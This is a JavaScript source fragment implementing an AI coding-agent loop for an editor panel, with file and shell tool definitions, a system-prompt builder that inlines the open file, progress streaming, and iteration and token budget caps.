        path: { type: 'string', description: 'File path where the file should live, e.g. "src/index.js" or an absolute path.' },
        content: { type: 'string', description: 'The complete new content of the file.' },
      },
      required: ['path', 'content'],
    },
  },
  {
    name: 'delete_file',
    description: 'Delete a real file (or an empty directory). Only call this if they explicitly asked to remove it.',
    input_schema: {
      type: 'object',
      properties: { path: { type: 'string', description: 'File or directory path to delete.' } },
      required: ['path'],
    },
  },
  {
    name: 'run_command',
    description:
      'Run a real shell command on the device and return its output — full terminal access like Claude Code. Use this to EXECUTE the code you wrote — run scripts, run tests, run a linter, install dependencies, run git — so you can verify your work actually runs and fix any errors it reports, rather than just writing code that looks right. The command runs with the real machine, real files, and real environment, in the working directory you give (cwd, default the workspace root). Output is capped at ~12k chars and the command is hard-killed after a timeout (default 30s, max 120s — pass timeoutMs for slow operations like npm install). A non-zero exit is fine — read the error output and fix the code. Prefer this over narrating that "the code should work": run it and prove it.',
    input_schema: {
      type: 'object',
      properties: {
        command: { type: 'string', description: 'The full shell command to run, e.g. "node src/index.js" or "npm test" or "git status".' },
        cwd: { type: 'string', description: 'Working directory to run in. Relative to workspace or absolute. Defaults to workspace root.' },
        timeoutMs: { type: 'number', description: 'Optional timeout in ms (1000–120000, default 30000).' },
      },
      required: ['command'],
    },
  },
];

// Files up to this size are inlined into the system prompt when they're the
// one open in the editor. Above it, the model falls back to read_file.
const ACTIVE_FILE_INLINE_MAX_CHARS = 24_000;

async function buildCodeSystemPrompt(userId, activeFileName) {
  const base = workspaceRoot();
  const files = await listCodeFiles(base, { recursive: true });
  const fileList = files.length
    ? files.slice(0, 60).map((f) => `- ${f.name} (${languageDisplayName(f.language)}, ${f.size ?? 0} bytes)`).join('\n') + (files.length > 60 ? `\n  … and ${files.length - 60} more (use search_files to find specific paths)` : '')
    : `(workspace root ${base} appears empty — check the path, or use search_files / list_files)` + `\n\nWorkspace root: ${base}`;

  // Inline the file they're looking at. The most common request by far is
  // "change something in this file", and without this every such request
  // costs a full extra model round trip (read_file, wait, then edit). With
  // the content already in context the model can edit_file immediately —
  // one less model call per edit is the biggest latency win in this panel.
  const active = activeFileName ? await findCodeFileByName(userId, activeFileName).catch(() => null) : null;
  let activeLine = `Workspace root: ${base}`;
  if (active && (active.content || '').length <= ACTIVE_FILE_INLINE_MAX_CHARS) {
    activeLine = `Workspace root: ${base}\n\nThey are currently looking at "${active.name}" in the editor. Its full, current content is below — edit it directly with edit_file; do NOT call read_file on it first.\n<file path="${active.name}">\n${active.content || ''}\n</file>`;
  } else if (activeFileName) {
    activeLine = `Workspace root: ${base}\n\nThey are currently looking at "${activeFileName}" in the editor. (Too large to inline, or not found — read_file it before editing.)`;
  }

  return [
    'You are the coding assistant embedded in Neurovance\'s code editor — a real pair-programmer with full read/write/execute access to the user\'s actual device and filesystem, not a chat that talks about code in the abstract.',
    'You can read, edit, write, and delete REAL files anywhere on the machine, list directories, search file contents, and run real shell commands with run_command (git, npm, running your code, tests, etc.). Relative paths resolve from the workspace root; absolute paths reach anywhere. You work directly on the user\'s real files — make changes in place, then VERIFY by running.',
    'Verify your work: after writing or editing code, run it with run_command to prove it works, and fix anything it reports. Prefer proving over asserting the code is right.',
    'Any server you write must bind to a port you choose and are told about; run_command reports output so you can see it binding. The preview opens at the reported URL, and the Run button runs the workspace entrypoint (npm run dev/start if package.json exists, else the single runnable entry file).',
    `Current files in workspace root: ${fileList}`,
    activeLine,
    'Editing rules: prefer edit_file for every change to an existing file — send only the changed snippet with enough surrounding lines to be unique. Use write_file only for brand-new files or a near-total rewrite. Before editing a file whose content you have not seen in this conversation (and that is not shown above), read_file it first — never guess at existing content.',
    // The single most common complaint about this panel: the model would
    // freeze a simple request behind a checklist of five clarifying questions.
    // Bias hard toward acting on a sensible assumption; when a question is
    // truly unavoidable, it is exactly one, short, and then it stops.
    'Clarifying questions: almost never needed. If the request is ambiguous in a way that would genuinely change what you build, ask exactly ONE short, specific question and stop — never a list of questions, never a menu of options, never "a few things to confirm". Otherwise make the most reasonable assumption, state it in one short line, and just do it.',
    'Work fast: do not call list_files unless you genuinely need orientation; the file listing is above and search_files is cheaper than guessing. Do not re-read a file you already have. Do not narrate what you are about to do — make the change, then report it.',
    'Use a serious, direct, professional tone. No greetings, encouragement, emojis, conversational filler, or playful language.',
    'After you are done, respond with a concise operational summary: one sentence when possible, never more than two short sentences. State changed files and any important limitation. Do not repeat file content, explain routine implementation details, or add optional next steps unless the user asked for them.',
  ].filter(Boolean).join('\n\n');
}

// Human-readable one-liner for a code tool call, streamed to the panel so the
// user watches the work happen ("Editing app.js") instead of staring at a
// disabled input until the whole loop finishes.
function codeToolLabel(toolUse) {
  const n = toolUse.input?.path || toolUse.input?.name || toolUse.input?.pattern || '';
  switch (toolUse.name) {
    case 'list_files': return 'Listing files';
    case 'search_files': return `Searching ${n}`;
    case 'read_file': return `Reading ${n}`;
    case 'edit_file': return `Editing ${n}`;
    case 'write_file': return `Writing ${n}`;
    case 'delete_file': return `Deleting ${n}`;
    case 'run_command': return 'Running command';
    default: return toolUse.name;
  }
}

// Returns { reply, changedFiles, usage } — changedFiles (names only) lets the
// frontend know which files to re-fetch/refresh without re-sending every
// file's full content back over the wire on every turn.
//
// onEvent (optional) receives progress as it happens so the route can stream
// it: { type: 'status', text } | { type: 'tool', name, label } |
// { type: 'text', text } (interim text the model wrote alongside tool calls).
export async function codeAgentPrompt(userId, user, prompt, activeFileName, history = [], onEvent = () => {}) {
  const emit = (evt) => { try { onEvent(evt); } catch (e) { /* a broken listener must never break the loop */ } };
  emit({ type: 'status', text: 'Reading workspace' });
  const system = await buildCodeSystemPrompt(userId, activeFileName);
  const messages = [...history, { role: 'user', content: prompt }];
  const { thinking, maxTokens } = resolveThinking(user?.effortLevel, 2048);
  const changedFiles = new Set();
  // Server.js's /api/code/prompt route destructures `usage` off this return
  // value to feed auth.incrementTokenUsage — this loop makes its own API
  // calls same as chatReply/runTask do, so it needs to accumulate and return
  // real totals across every iteration, not just the last one.
  let usage = { input_tokens: 0, output_tokens: 0 };
  // Same runaway-loop protection runLoop has — the code agent can also chain
  // tool calls indefinitely; without a cap a stuck model bills tokens forever.
  const MAX_CODE_ITERATIONS = 40;
  const MAX_CODE_INPUT_TOKENS = 500_000;
  let totalIterations = 0;

  // eslint-disable-next-line no-constant-condition
  while (true) {
    totalIterations++;

    if (totalIterations > MAX_CODE_ITERATIONS || usage.input_tokens > MAX_CODE_INPUT_TOKENS) {
      const partial = messages.filter((m) => m.role === 'assistant').map((m) => {
        return Array.isArray(m.content) ? m.content.filter((b) => b.type === 'text').map((b) => b.text).join('\n') : m.content;
      }).filter(Boolean).join('\n').slice(-4000);
      emit({ type: 'status', text: 'Stopping — work budget reached' });
      return { reply: `Reached this edit's work budget after ${totalIterations} iterations — stopping to avoid a runaway. Here is what was done so far:\n${partial || '(nothing completed yet)'}`, changedFiles: [...changedFiles], usage };
    }

    emit({ type: 'status', text: 'Thinking' });
    const response = await client.messages.create({
      model: resolveModel(user?.model),
      max_tokens: maxTokens,
      system,
      tools: CODE_TOOLS,
      messages,
      ...(thinking ? { thinking } : {}),
    });
    if (response.usage) {
      usage.input_tokens += response.usage.input_tokens || 0;
      usage.output_tokens += response.usage.output_tokens || 0;
    }

    messages.push({ role: 'assistant', content: response.content });

    const toolUses = response.content.filter((b) => b.type === 'tool_use');
    if (toolUses.length === 0) {
      const text = response.content.filter((b) => b.type === 'text').map((b) => b.text).join('\n');
      return { reply: text, changedFiles: [...changedFiles], usage };
    }

    // Anything the model said while calling tools ("Adding the route now.")
    // is worth showing immediately rather than dropping.
    const interim = response.content.filter((b) => b.type === 'text').map((b) => b.text).join('\n').trim();
    if (interim) emit({ type: 'text', text: interim });
    for (const toolUse of toolUses) emit({ type: 'tool', name: toolUse.name, label: codeToolLabel(toolUse) });

    const toolResults = await Promise.all(toolUses.map(async (toolUse) => {
      try {
        if (toolUse.name === 'list_files') {
          const p = toolUse.input.path;
          const files = await listCodeFiles(p || undefined, { recursive: !!toolUse.input.recursive });
          const listing = files.map((f) => `${f.name} (${languageDisplayName(f.language)}, ${f.size ?? 0}B)`).join('\n') || '(no files)';
          return { type: 'tool_result', tool_use_id: toolUse.id, content: listing };
        }
        if (toolUse.name === 'search_files') {
          const res = await searchFiles({
            pattern: toolUse.input.pattern,
            query: toolUse.input.query,
            dir: toolUse.input.dir,
          });
          const listing = res.map((m) => `${m.path}${m.line ? ':' + m.line : ''}`).join('\n') || '(no matches)';
          return { type: 'tool_result', tool_use_id: toolUse.id, content: listing };
        }
        if (toolUse.name === 'read_file') {
          const file = await findCodeFileByName(userId, toolUse.input.path);
          if (!file) return { type: 'tool_result', tool_use_id: toolUse.id, content: `No file at "${toolUse.input.path}".`, is_error: true };
          return { type: 'tool_result', tool_use_id: toolUse.id, content: file.content || '(empty file)' };
        }
        if (toolUse.name === 'edit_file') {
          const { path, old_string, new_string, replace_all } = toolUse.input;
          const { occurrences } = await editCodeFile(userId, path, old_string, new_string, !!replace_all);
          changedFiles.add(path);
          return { type: 'tool_result', tool_use_id: toolUse.id, content: occurrences === 1 ? `Edited ${path}.` : `Edited ${path} (${occurrences} replacements).` };
        }
        if (toolUse.name === 'write_file') {
          const { path, content } = toolUse.input;
          const { created } = await writeCodeFile(userId, path, content);
          changedFiles.add(path);
          return { type: 'tool_result', tool_use_id: toolUse.id, content: created ? `Created ${path}.` : `Updated ${path}.` };
        }
        if (toolUse.name === 'delete_file') {
          const path = toolUse.input.path;
          const existed = await deleteCodeFileByName(userId, path);
          if (existed) changedFiles.add(path);
          return { type: 'tool_result', tool_use_id: toolUse.id, content: existed ? `Deleted ${path}.` : `No file at "${path}".` };
        }
        if (toolUse.name === 'run_command') {
          const r = await runCommand(userId, { command: toolUse.input.command, timeoutMs: toolUse.input.timeoutMs, cwd: toolUse.input.cwd });
          const head = r.ok ? 'Command succeeded.' : (r.timedOut ? 'Command timed out.' : 'Command exited with error.');
          return { type: 'tool_result', tool_use_id: toolUse.id, content: `${head}\n${r.output}` };
        }
        return { type: 'tool_result', tool_use_id: toolUse.id, content: 'Unknown tool.', is_error: true };
      } catch (e) {
        return { type: 'tool_result', tool_use_id: toolUse.id, content: e.message, is_error: true };
      }
    }));

    messages.push({ role: 'user', content: toolResults });
  }
}
